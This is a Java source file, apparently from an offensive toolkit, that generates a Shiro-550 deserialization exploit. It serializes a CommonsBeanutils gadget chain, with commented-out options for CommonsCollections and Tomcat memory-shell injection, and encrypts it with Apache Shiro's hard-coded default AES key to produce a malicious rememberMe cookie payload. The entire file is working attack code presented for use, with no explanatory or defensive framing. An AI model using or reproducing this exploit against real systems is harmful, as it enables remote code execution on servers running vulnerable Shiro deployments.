package com.Jasetol.payloads.shiro;

import com.Jasetol.Torjans.CommonsCollections11InjectTemplatesImpl;
import com.Jasetol.payloads.CommonsBeanutils;
import com.Jasetol.payloads.CommonsCollections11;
import com.Jasetol.utils.ParseArgs;
import com.Jasetol.utils.SerWithUnSer;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.util.Base64;
import java.util.HashSet;
import java.util.PriorityQueue;

public class Shiro550 {
    public static byte[] getByte() throws Exception{
        //HashSet object = (HashSet) CommonsCollections11InjectTomcat.getObject();
        //HashMap object = (HashMap) URLDNS.getObject();
        PriorityQueue object = (PriorityQueue) CommonsBeanutils.getObject();
        //HashSet object = (HashSet) CommonsCollections11InjectTomcat.getObject();
        //HashSet object = (HashSet) CommonsCollections11.getObject();
        //HashSet object = (HashSet) CommonsCollections11InjectTemplatesImpl.getObject();
        byte[] bytes = SerWithUnSer.serialize(object);
        return bytes;
    }

    public static void main(String[] args) throws Exception{
        ParseArgs.parseArgs(args);
        byte[] plaintext = getByte();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        String payload = encryptAes(plaintext, key);
        System.out.println(payload);
    }

    public static String encryptAes(byte[] plaintext,byte[] key){
        AesCipherService aesCipherService = new AesCipherService();
        ByteSource encrypt = aesCipherService.encrypt(plaintext, key);
        return encrypt.toString();
    }
}
